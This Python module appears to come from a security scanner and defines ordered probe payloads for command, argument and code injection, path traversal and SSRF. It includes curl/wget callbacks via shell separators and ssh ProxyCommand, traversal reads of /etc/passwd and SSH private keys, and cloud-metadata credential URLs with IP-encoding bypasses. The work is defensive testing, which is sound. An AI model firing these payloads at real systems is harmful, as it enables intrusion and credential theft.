"""Per-class verdict batteries: ordered templates of technique primitive x context/encoding/target variant.

See the payload-synthesis design doc and the vuln-types / detection-techniques doc.
- Each template = {value, channel, control, expect, delay_target, technique}; the {CALLBACK}/{TOKEN}
  placeholders in value/expect are substituted by core after the oracle observable is minted.
- Ordering: **egress-free and non-destructive first** (in-band reflection/differential/file read), with
  `sleep`/OOB/file-write later, paired with budgeted top-N selection to cut request volume and the risk of
  slowing the server down (DoS).
- Channels: inband (match a signature in the response/error) / timing (delay difference) / oob (out-of-band
  callback) / differential (diff against baseline) / cross_tool (write a canary then read it back via a read
  tool). Program-aware payloads were dropped; these are all generic static templates.
- Payloads follow the PayloadsAllTheThings / SecLists spirit, de-Windows-ed / de-noised and instrumented,
  generic and not targeted at any specific server.
"""
from __future__ import annotations

import secrets

from calchas.sink.types import AI, CI, CODE, PT, SSRF

# ---------------- command injection ----------------
# shell context variants: {c} is the command to inject.
_CI_CONTEXTS = ["; {c}", "| {c}", "|| {c}", "& {c}", "&& {c}",
                "$({c})", "`{c}`", "\n{c}\n", "'; {c} #", '"; {c} #']
# Eval-type echo: after execution "{TOKEN}1681" (41*41) appears; if the input is merely echoed verbatim,
# "{TOKEN}$((41*41))" appears instead and does not match — this distinguishes "truly executed" from "input
# echoed", avoiding false positives.
_CI_ECHO = "echo {TOKEN}$((41*41))"
_CI_ECHO_IFS = "echo${IFS}{TOKEN}$((41*41))"   # bypass when spaces are filtered
_CI_ECHO_EXPECT = ["{TOKEN}1681"]


def _ci_battery() -> list[dict]:
    out = []
    # 1) in-band eval echo (network-independent, non-destructive, sent first)
    for ctx in _CI_CONTEXTS:
        out.append({"value": ctx.format(c=_CI_ECHO), "channel": "inband",
                    "expect": list(_CI_ECHO_EXPECT), "control": None, "delay_target": 0.0,
                    "technique": f"ci:echo:{ctx[:4]}"})
    # 1b) space-bypass variant
    for ctx in ("; {c}", "|{c}"):
        out.append({"value": ctx.format(c=_CI_ECHO_IFS), "channel": "inband",
                    "expect": list(_CI_ECHO_EXPECT), "control": None, "delay_target": 0.0,
                    "technique": f"ci:echo-ifs:{ctx[:3]}"})
    # 2) out-of-band callback
    for ctx in _CI_CONTEXTS:
        out.append({"value": ctx.format(c="curl {CALLBACK}"), "channel": "oob",
                    "expect": None, "control": None, "delay_target": 0.0,
                    "technique": f"ci:curl:{ctx[:4]}"})
    # 3) time-based blind (slows things down, placed later)
    for ctx in _CI_CONTEXTS:
        out.append({"value": ctx.format(c="sleep 5"), "channel": "timing",
                    "expect": None, "control": ctx.format(c="sleep 0"), "delay_target": 5.0,
                    "technique": f"ci:sleep:{ctx[:4]}"})
    # 4) cross_tool: write a canary to /tmp/{token}, then read it back via a read tool (content contains token)
    for ctx in _CI_CONTEXTS[:3]:
        out.append({"value": ctx.format(c="echo {TOKEN}$((41*41)) > /tmp/{TOKEN}"), "channel": "cross_tool",
                    "expect": list(_CI_ECHO_EXPECT), "control": None, "delay_target": 0.0,
                    "technique": f"ci:writecanary:{ctx[:4]}"})
    return out


# ---------------- argument injection ----------------
def _ai_battery() -> list[dict]:
    # Unknown option bearing a token first (an error echoing the option proves it was "parsed as an option",
    # program-independent and reliable); then --version/--help etc. benign feature-option differential.
    # File-writing options are program-dependent with uncontrollable content, not included for now.
    # reflection_safe=False: the token is in the option name itself, so it also appears if echoed verbatim
    # -> a hit requires an "unknown option"-type error fingerprint to corroborate (proving the argv parser
    # rejected it as an option) before it counts as confirmed, otherwise only weak evidence, avoiding input-echo FPs.
    out = [
        {"value": "--{TOKEN}", "channel": "inband", "expect": None, "control": None,
         "delay_target": 0.0, "technique": "ai:unknown-long", "reflection_safe": False},
        {"value": "--{TOKEN}=1", "channel": "inband", "expect": None, "control": None,
         "delay_target": 0.0, "technique": "ai:unknown-long-eq", "reflection_safe": False},
        {"value": "-{TOKEN}", "channel": "inband", "expect": None, "control": None,
         "delay_target": 0.0, "technique": "ai:unknown-short", "reflection_safe": False},
    ]
    for opt in ("--version", "-V", "--help", "-h", "--usage"):
        out.append({"value": opt, "channel": "differential", "expect": None, "control": None,
                    "delay_target": 0.0, "technique": f"ai:{opt}"})
    # -- side-effecting option-injection gadgets (oob/timing channels) --
    # Some binaries interpret a "value option" as "run an external command" (ssh/scp/sftp's ProxyCommand etc.);
    # using that, an injected value parsed by argv as an option produces a **verifiable side effect** — an OOB
    # callback / timing delay. The essential difference from the inband/differential ones above: it **does not
    # rely on the target echoing the sub-command's error/output** — when the host tool swallows the subprocess
    # stderr (returning only {"success":false} or similar), inband/differential go blind while the side-effect
    # channel still hits. The side effect itself (our own callback URL / a fixed 5s delay) is fully controllable
    # and verifiable, so it does not violate the old principle "do not include file-writing options with
    # uncontrollable content". Generic gadget corpus, not targeted at any server; what single-value injection
    # can reliably hit is mainly the ssh/scp/sftp ProxyCommand family (the option carries its own value, and the
    # host tool's connect needs only 1 operand); other families (rsync --rsh / git core.sshCommand etc. need
    # extra operands or tokenization) are often out of reach for single-value injection — this corpus can be
    # extended later.
    for cmd, ch, delay in (("curl {CALLBACK}", "oob", 0.0),
                           ("wget -qO- {CALLBACK}", "oob", 0.0),
                           ("sleep 5", "timing", 5.0)):
        out.append({"value": f"-oProxyCommand={cmd}", "channel": ch, "expect": None,
                    "control": None, "delay_target": delay,
                    "technique": f"ai:gadget:proxycmd:{ch}"})
    return out


# ---------------- path traversal ----------------
_PT_PASSWD_SIGS = ["root:x:0:0:", "root:x:0:0", "daemon:x:"]
_PT_WIN_SIGS = ["[fonts]", "[extensions]", "for 16-bit app support"]
_PT_PASSWD = [
    "../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../etc/passwd",
    "/etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",                     # URL-encoded
    "..%252f..%252f..%252f..%252fetc%252fpasswd",               # double-encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\..\\..\\etc\\passwd",                       # backslash separators
    "../../../../../../etc/passwd%00",                           # null-byte truncation (historical)
    "../../../../../../etc/passwd\x00.png",
]
_PT_WIN = [
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../windows/win.ini",
    "....\\....\\....\\....\\windows\\win.ini",
]
# Expanded read targets: an SSH private key has a highly reliable header signature that cannot misfire; add a group of read targets (inband confirmation).
_PT_KEY_SIGS = ["BEGIN OPENSSH PRIVATE KEY", "BEGIN RSA PRIVATE KEY",
                "BEGIN DSA PRIVATE KEY", "BEGIN EC PRIVATE KEY"]
_PT_KEY = [
    "/root/.ssh/id_rsa",
    "../../../../../../root/.ssh/id_rsa",
    "../../../../.ssh/id_rsa",
]
# Write-type path traversal (no content echo): out-of-bounds path (traversal + absolute), with {TOKEN} as the unique canary name.
# {TOKEN} already carries a prefix, so the path does not add one itself (otherwise it would stack into a double prefix).
# Verdict is in executor: fail-closed — after the write, read back that unique landing path via the read-back tool;
# reading content = it truly landed out of bounds = confirmed; unable to read (blocked by a fence / no read-back tool) -> no conclusion.
# No longer parses the server's "rejection wording".
_PT_CONFINE = [
    "/tmp/{TOKEN}",
    "../../../../../../tmp/{TOKEN}",
    "/tmp/{TOKEN}.txt",
]


def _pt_battery() -> list[dict]:
    out = [{"value": v, "channel": "inband", "expect": list(_PT_PASSWD_SIGS), "control": None,
            "delay_target": 0.0, "technique": f"pt:passwd:{v[:16]}"} for v in _PT_PASSWD]
    out += [{"value": v, "channel": "inband", "expect": list(_PT_KEY_SIGS), "control": None,
             "delay_target": 0.0, "technique": f"pt:key:{v[:16]}"} for v in _PT_KEY]
    out += [{"value": v, "channel": "inband", "expect": list(_PT_WIN_SIGS), "control": None,
             "delay_target": 0.0, "technique": f"pt:win:{v[:16]}"} for v in _PT_WIN]
    # Fence-differential last: a confirmation read (passwd/key echo) returns confirmed first; only no-content-echo writes/reads fall back to it for a suspected verdict.
    out += [{"value": v, "channel": "path_confine", "expect": None, "control": None,
             "delay_target": 0.0, "technique": f"pt:confine:{v[:22]}"} for v in _PT_CONFINE]
    return out


# ---------------- SSRF ----------------
# Cloud-metadata signatures: must be words that appear **only in the response body and not in the URL path we
# send**, otherwise echoing the URL verbatim would misfire (e.g. security-credentials/iam/meta-data are all
# URL-path words, already removed).
_SSRF_META_SIGS = ["ami-id", "instance-id", "AccessKeyId", "SecretAccessKey",
                   "InstanceProfile", "owner-account-id", "ssh-rsa",
                   # keys in the Azure IMDS instance response body (not in the URL path)
                   "azEnvironment", "vmId", "subscriptionId",
                   # identifier in the GCP metadata service response/error header (a request lacking this header gets 403 and echoes it)
                   "Metadata-Flavor"]


def _ssrf_battery() -> list[dict]:
    # 1) OOB callback — placement-aware "injection forms". A real sink rarely requests the parameter value
    #    verbatim as a complete URL; more often it is interpolated into a larger structure (host only /
    #    prefix-suffix concatenation / query sub-URL / host allowlist). Whole-value replacement breaks the URL
    #    structure so the request never goes out (the main cause of many clean results). So one callback target
    #    derives several placements, and whichever lets the server actually send the request hits.
    #    {CALLBACK}=full URL (with token); {CALLBACK_HOST}=host:port/token (no scheme, token still in path ->
    #    an OOB hit is attributable). Proving the server initiated a request = weak evidence -> suspected.
    # The order is the priority: when the budget is tight (the floor takes the first 2), the two most common
    # sink shapes must be covered first — "value = full URL" and "value = host (server adds scheme/path)" — so
    # those two go first.
    oob_forms = [
        ("{CALLBACK}", "ssrf:oob"),                                  # value = full URL (most common)
        ("{CALLBACK_HOST}", "ssrf:oob-hostonly"),                    # value = host (server adds scheme/path itself)
        ("//{CALLBACK_HOST}", "ssrf:oob-protorel"),                  # protocol-relative
        ("https://trusted.example.com@{CALLBACK_HOST}", "ssrf:oob-at"),  # @ obfuscation to bypass a host allowlist
        ("{CALLBACK}#", "ssrf:oob-frag"),                            # server appends suffix -> lands in the fragment
        ("{CALLBACK}?x=", "ssrf:oob-query"),                         # server appends suffix -> lands in the query
        ("{CALLBACK}/x", "ssrf:oob-path"),                           # with a path
        ("?url={CALLBACK}", "ssrf:oob-urlparam"),                    # value spliced into an existing query string
        ("?target={CALLBACK}", "ssrf:oob-targetparam"),
    ]
    # Public callback (hitting our collector): only proves "the server can make outbound requests" =
    # reachability, NOT SSRF — for URL-fetching tools this is the intended function. target_scope="public" ->
    # executor does not derive a vulnerability from it.
    out = [{"value": v, "channel": "oob", "expect": None, "control": None, "target_scope": "public",
            "delay_target": 0.0, "technique": t} for v, t in oob_forms]
    # 2) Trust boundary: cloud-metadata endpoints (AWS/Aliyun/Tencent Cloud/Azure/GCP, incl. IP-mangling bypass).
    #    target_scope="internal": these targets are **only reachable by crossing the trust boundary**. A hit on
    #    a metadata-body signature = confirmed; even without a body echo, as long as is_error==False (the server
    #    successfully fetched the internal resource) -> suspected (see executor).
    for url in ("http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://2852039166/latest/meta-data/",       # 169.254.169.254 in decimal
                "http://0xA9FEA9FE/latest/meta-data/",        # hex
                "http://[::ffff:169.254.169.254]/latest/meta-data/",  # IPv6-mapped
                "http://100.100.100.200/latest/meta-data/",   # Aliyun
                "http://metadata.tencentyun.com/latest/meta-data/",   # Tencent Cloud
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure IMDS
                "http://metadata.google.internal/computeMetadata/v1/"):            # GCP
        out.append({"value": url, "channel": "inband", "expect": list(_SSRF_META_SIGS),
                    "control": None, "target_scope": "internal",
                    "delay_target": 0.0, "technique": f"ssrf:meta:{url[:26]}"})
    # 3) Loopback / intranet hosts: if the server can fetch these (is_error==False) it has already crossed the
    #    trust boundary -> suspected SSRF. No metadata-body signature; judged by "successfully fetched an internal
    #    resource" (fail-closed: only success counts, a rejection/error does not).
    for url in ("http://127.0.0.1/", "http://127.0.0.1:3000/", "http://localhost/",
                "http://169.254.0.23/", "http://[::1]/"):
        out.append({"value": url, "channel": "inband", "expect": None,
                    "control": None, "target_scope": "internal",
                    "delay_target": 0.0, "technique": f"ssrf:loopback:{url[:24]}"})
    # 4) Host-only form of metadata endpoints (when the sink accepts only a host and adds scheme/path itself)
    for host in ("169.254.169.254", "metadata.google.internal", "metadata.tencentyun.com"):
        out.append({"value": host, "channel": "inband", "expect": list(_SSRF_META_SIGS),
                    "control": None, "target_scope": "internal",
                    "delay_target": 0.0, "technique": f"ssrf:meta-host:{host[:18]}"})
    # 5) file:// protocol to read local files (if the fetcher supports the file scheme -> returns /etc/passwd), an internal read -> internal
    out.append({"value": "file:///etc/passwd", "channel": "inband", "expect": list(_PT_PASSWD_SIGS),
                "control": None, "target_scope": "internal",
                "delay_target": 0.0, "technique": "ssrf:file"})
    return out


# ---------------- code injection (CWE-94: in-process language interpreter / template engine / eval) ----------------
# Verdict (policy ①, see the code-injection design doc §9): **any eval-echo confirms** — the server computed a
# result I never sent (the product is not in the payload -> reflection-immune), which can only mean the server
# evaluated the parameter = code injection (CWE-94, execution-confirmed).
# No special-casing of "arithmetic vs code"; tier only labels the **impact level** for the verdict engine, it is
# not a confirmation gate:
#   L1 = bare arithmetic {A}*{B} (impact=arithmetic_eval).
#   L2 = the input treated as "code/template structure": a template delimiter ({{}}/${}/<%%>/#{}) or a function
#        call (ord/charCodeAt/length) — a pure arithmetic parser errors without echoing, only a general
#        code/template engine echoes (impact=rce). Placed first to capture the strongest impact.
# Random operands (4 digits) each call, to rule out "happening to coincide with a fixed number"; generic static
# templates, not targeted at any server.
# declared_domain is produced separately by the sink LLM, as a manual-review annotation only, not part of this
# battery's/verdict's adjudication.
def _code_battery() -> list[dict]:
    A = secrets.randbelow(9000) + 1000        # random 4-digit operand
    B = secrets.randbelow(9000) + 1000
    a, b = str(A), str(B)
    expr = a + "*" + b                         # "1234*5678"
    P = str(A * B)                             # L1 / template family expected: the arithmetic product (6-8 digits, not in the payload)
    ORD = str(77 * A)                          # function family expected: ord("M")=77 -> 77*A
    LEN = str(8 * A)                           # function family expected: len("McpfTest")=8 -> 8*A

    out: list[dict] = []

    def add(value, expect, technique, tier, channel="inband", control=None, delay=0.0):
        out.append({"value": value, "channel": channel, "expect": expect, "control": control,
                    "delay_target": delay, "technique": technique, "tier": tier})

    # L2 out-of-domain (strongest discriminating power, placed first, a hit confirms) —
    #  - template/language delimiter family: the engine must recognize {{}} / ${} / <%%> / #{} to evaluate (SSTI / template injection).
    add("{{" + expr + "}}",    [P], "code:l2:tmpl-curly", "L2")    # Jinja2/Twig/Handlebars/Angular
    add("${" + expr + "}",     [P], "code:l2:tmpl-dollar", "L2")   # EL/Thymeleaf/JS template literal/Freemarker
    add("<%= " + expr + " %>", [P], "code:l2:tmpl-erb", "L2")      # ERB/EJS/JSP
    add("#{" + expr + "}",     [P], "code:l2:tmpl-hash", "L2")     # Ruby string interpolation / some EL
    #  - function-call family: the engine must actually call a function (ord/charCodeAt/length), which a pure arithmetic parser cannot.
    add('ord("M")*' + a,          [ORD], "code:l2:py-ord", "L2")        # Python / generic eval
    add('"M".charCodeAt(0)*' + a, [ORD], "code:l2:js-charcode", "L2")  # JavaScript
    add('"M".ord*' + a,           [ORD], "code:l2:ruby-ord", "L2")     # Ruby
    add('len("McpfTest")*' + a,   [LEN], "code:l2:py-len", "L2")       # Python len
    #  - object-graph / class-reflection family: covers two sinks a pure arithmetic engine **cannot** reach —
    #    Python format-string injection (CWE-94/134, controlling a `str.format()` format string to do attribute
    #    access) and **sandbox-escape SSTI** (the engine forbids arithmetic but permits attribute access).
    #    Criterion = the engine walks the object graph to the root class and echoes the runtime class repr
    #    `<class 'object'>` / `class java.lang.Object`. These signatures are not in the payload (the payload has
    #    __class__/__mro__ etc.) -> reflection-immune; and only truly walking the MRO reaches object, while a tool
    #    that does only type-repr on the input (yielding just `<class 'str'>`) does not hit -> low FP. A hit = out-of-domain (impact=rce).
    OBJ = ["<class 'object'>", "class java.lang.Object"]
    add('{{"".__class__.__mro__}}', OBJ, "code:l2:ssti-mro", "L2")      # Jinja2/Twig object graph
    add('{{[].__class__.__base__}}', OBJ, "code:l2:ssti-base", "L2")
    add('{0.__class__.__mro__}',    OBJ, "code:l2:pyfmt-mro", "L2")     # Python str.format() format string
    add("${''.class.superclass}",   OBJ, "code:l2:java-el", "L2")       # Java EL / SpEL reflection
    #  - statement-print family: the engine executes a statement that "calls a print function", outputting the
    #    computed product to logs/stdout. Fits a sink that "executes code but does not return the expression
    #    value" (e.g. pptr executeCode returns undefined, only collecting console.log into logs). The product is
    #    not in the payload -> reflection-immune; a hit = a statement was executed (not pure value retrieval) ->
    #    impact=rce. One per language; an engine that does not match errors out quickly.
    add("console.log(" + expr + ")", [P], "code:l2:js-log", "L2")       # JavaScript / Node vm
    add("print(" + expr + ")",       [P], "code:l2:py-print", "L2")     # Python
    add("puts " + expr,              [P], "code:l2:rb-puts", "L2")      # Ruby
    add("echo " + expr + ";",        [P], "code:l2:php-echo", "L2")     # PHP

    # L1 eval echo (bare arithmetic; a hit confirms, impact=arithmetic_eval).
    add(expr,            [P], "code:l1:bare", "L1")
    add(a + " * " + b,   [P], "code:l1:bare-spaced", "L1")

    # L3 interpreter error (weak evidence -> suspected): a deliberate syntax error, caught via oracle.fingerprint on the traceback (not via an inband hit).
    add(expr + "*(",  None, "code:l3:syntaxerr", "")
    add(expr + " +/ ", None, "code:l3:syntaxerr2", "")

    # L4 time-based blind (slows things down, placed later): each engine uses its own "sleep/busy-wait" syntax —
    #   whichever engine it is, that one line takes effect, the non-matching ones error out quickly.
    #   A hit = the server truly executed the code (RCE-level), confirmed via the timing channel by differential
    #   (control = an isomorphic zero-delay control). Fits "executes but no echo" sinks (vegalite eval / Jij exec /
    #   pptr JS vm etc.). A parser that rewrites bare names (SymPy parse_expr's auto_symbol) makes these bare names
    #   fail -> left as a known boundary, handled manually.
    add('__import__("time").sleep(5)', None, "code:l4:py-sleep", "L2",      # Python eval/exec
        channel="timing", control='__import__("time").sleep(0)', delay=5.0)
    add("const _t=Date.now()+5000;while(Date.now()<_t){};0", None, "code:l4:js-busy", "L2",  # JS synchronous busy-wait (no import needed)
        channel="timing", control="const _t=Date.now()+0;while(Date.now()<_t){};0", delay=5.0)
    add("sleep(5)", None, "code:l4:rb-sleep", "L2",                        # Ruby (Kernel#sleep, global)
        channel="timing", control="sleep(0)", delay=5.0)
    add("sleep(5);", None, "code:l4:php-sleep", "L2",                      # PHP
        channel="timing", control="sleep(0);", delay=5.0)
    return out


_BATTERIES = {CI: _ci_battery, AI: _ai_battery, PT: _pt_battery, SSRF: _ssrf_battery,
              CODE: _code_battery}


def get_battery(vuln_class: str) -> list[dict]:
    """Return the ordered template list for an injection class; an unsupported class returns empty."""
    fn = _BATTERIES.get(vuln_class)
    return fn() if fn else []
